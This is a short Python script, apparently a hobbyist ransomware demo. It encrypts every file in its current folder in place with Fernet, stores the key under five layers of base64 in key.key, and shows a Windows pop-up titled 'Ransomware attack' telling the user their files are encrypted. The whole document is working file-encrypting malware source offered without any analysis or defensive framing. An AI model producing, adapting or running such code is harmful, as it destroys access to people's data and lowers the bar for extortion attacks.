import os, ctypes, base64
from cryptography.fernet import Fernet

files = []  # array for all files in folder
for file in os.listdir():  # Scan files in current folder
    if file == "encrypt.py" or file == "key.key" or file == "decrypt.py":  # skip these files
        continue
    if os.path.isfile(file):  # if file add to array
        files.append(file)

key = Fernet.generate_key()  # generate key
for file in files:  # encrypt every file within "files" array
    with open(file, "rb")as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)  # ENCRYPT AGAIN WITH BASE64 OR SMT ELSE :)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print(key)
# encrypt key 5 times with base64 before save
i = 1
while i <= 5:
    key = base64.b64encode(key)
    i = i + 1
with open("key.key", "wb") as keyfile:
    keyfile.write(key)

# test
print(files, "\n", key)

ctypes.windll.user32.MessageBoxW(None, "All your files have been encrypted, \n if you want your files back run the "
                                       "decrypt program, if you dare.", "Ransomware attack", 0)
